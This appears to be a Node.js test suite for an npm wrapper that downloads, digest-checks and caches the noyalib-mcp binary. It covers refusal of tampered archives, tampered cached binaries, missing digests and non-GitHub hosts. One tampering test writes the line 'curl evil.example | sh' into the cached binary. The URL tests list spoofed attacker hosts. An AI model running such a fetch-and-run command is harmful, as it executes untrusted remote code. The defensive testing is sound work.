// SPDX-License-Identifier: MIT OR Apache-2.0
// Copyright (c) 2026 Noyalib. All rights reserved.

// The wrapper runs nothing it cannot verify. Run: node --test test/

"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { execFileSync } = require("node:child_process");

const PKG = require("../package.json");
const b = require("../bootstrap");

const PLATFORM = "linux";
const ARCH = "x64";
const TRIPLE = "x86_64-unknown-linux-musl";

// A release-shaped archive holding a stand-in binary.
function fixture() {
    const work = fs.mkdtempSync(path.join(os.tmpdir(), "noyalib-npm-"));
    const top = `noyalib-mcp-${PKG.version}-${TRIPLE}`;
    fs.mkdirSync(path.join(work, top));
    const binary = Buffer.from("#!/bin/sh\necho stand-in\n");
    fs.writeFileSync(path.join(work, top, "noyalib-mcp"), binary);
    const archive = `${top}.tar.gz`;
    execFileSync("tar", ["-czf", archive, top], { cwd: work });
    const bytes = fs.readFileSync(path.join(work, archive));
    const digests = {
        version: PKG.version,
        targets: {
            [TRIPLE]: {
                archive,
                archive_sha256: b.sha256(bytes),
                binary_sha256: b.sha256(binary),
            },
        },
    };
    return { work, bytes, digests, cacheRoot: path.join(work, "cache") };
}

function options(f, overrides = {}) {
    let fetched = 0;
    const opts = {
        digests: f.digests,
        cacheRoot: f.cacheRoot,
        fetch: async (url) => {
            fetched += 1;
            assert.ok(url.startsWith("https://github.com/"), url);
            return f.bytes;
        },
        ...overrides,
    };
    return { opts, fetched: () => fetched };
}

test("a verified archive installs and the cached copy is reused", async () => {
    const f = fixture();
    const { opts, fetched } = options(f);
    const binary = await b.downloadOrCached(PLATFORM, ARCH, opts);
    assert.equal(binary, path.join(f.cacheRoot, PKG.version, "noyalib-mcp"));
    assert.equal(await b.downloadOrCached(PLATFORM, ARCH, opts), binary);
    assert.equal(fetched(), 1);
});

test("a tampered archive is refused before it is unpacked", async () => {
    const f = fixture();
    const tampered = Buffer.concat([f.bytes, Buffer.from("x")]);
    const { opts } = options(f, { fetch: async () => tampered });
    await assert.rejects(b.downloadOrCached(PLATFORM, ARCH, opts), /does not match its published SHA-256/);
    assert.equal(fs.existsSync(path.join(f.cacheRoot, PKG.version, "noyalib-mcp")), false);
});

test("a platform with no digest is refused with the alternatives", async () => {
    const f = fixture();
    for (const digests of [undefined, { version: PKG.version, targets: {} }, { ...f.digests, version: "0.0.1" }]) {
        const { opts, fetched } = options(f, { digests });
        await assert.rejects(b.downloadOrCached(PLATFORM, ARCH, opts), (e) => {
            assert.match(e.message, /no verified digest/);
            assert.match(e.message, /cargo install noyalib-mcp/);
            assert.match(e.message, /docker run/);
            return true;
        });
        assert.equal(fetched(), 0, "nothing is downloaded without a digest");
    }
});

test("a tampered cached binary is refused, not run", async () => {
    const f = fixture();
    const { opts } = options(f);
    const binary = await b.downloadOrCached(PLATFORM, ARCH, opts);
    fs.appendFileSync(binary, "curl evil.example | sh\n");
    await assert.rejects(b.downloadOrCached(PLATFORM, ARCH, opts), /does not match its published digest/);
});

test("downloads stay on GitHub's release hosts over https", () => {
    for (const ok of [
        "https://github.com/sebastienrousseau/noyalib-mcp/releases/download/v1/x",
        "https://objects.githubusercontent.com/x",
        "https://release-assets.githubusercontent.com/x",
    ]) {
        assert.doesNotThrow(() => b.checkUrl(ok), ok);
    }
    for (const bad of [
        "http://github.com/x",
        "https://evil.example/x",
        "https://github.com.evil.example/x",
    ]) {
        assert.throws(() => b.checkUrl(bad), /refusing to download/, bad);
    }
});

test("an unsupported platform names the alternatives", () => {
    assert.throws(() => b.targetTriple("aix", "ppc64"), /cargo install/);
});
